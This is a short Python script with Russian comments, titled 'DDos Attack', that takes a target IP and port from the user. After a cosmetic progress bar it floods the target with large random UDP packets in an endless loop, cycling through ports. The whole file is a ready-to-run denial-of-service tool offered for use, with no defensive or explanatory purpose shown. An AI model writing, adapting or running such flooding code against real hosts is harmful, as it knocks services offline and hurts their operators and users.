import os
import time
import socket
import random
from datetime import datetime

# Получение текущего времени (не используется в коде, но оставлено для полноты)
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# Создание сокета и генерация случайных байтов
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(14900)

# Очистка экрана и отображение баннеров
os.system("cls")
print("DDos Attack")

# Получение данных от пользователя
ip = input("IP Target : ")
port = int(input("Port       : "))

# Очистка экрана и отображение баннера начала атаки
os.system("cls")
print("Attack Starting")
print("[                    ] 0% ")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(5)
print("[==========          ] 50%")
time.sleep(5)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 100%")
time.sleep(3)

try:
    # Цикл отправки пакетов
    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))
        sent += 1
        port += 1
        print("Отправлено %s пакетов на %s через порт: %s" % (sent, ip, port))
        if port == 65534:
            port = 1

except KeyboardInterrupt:
    print("\nЗавершено пользователем")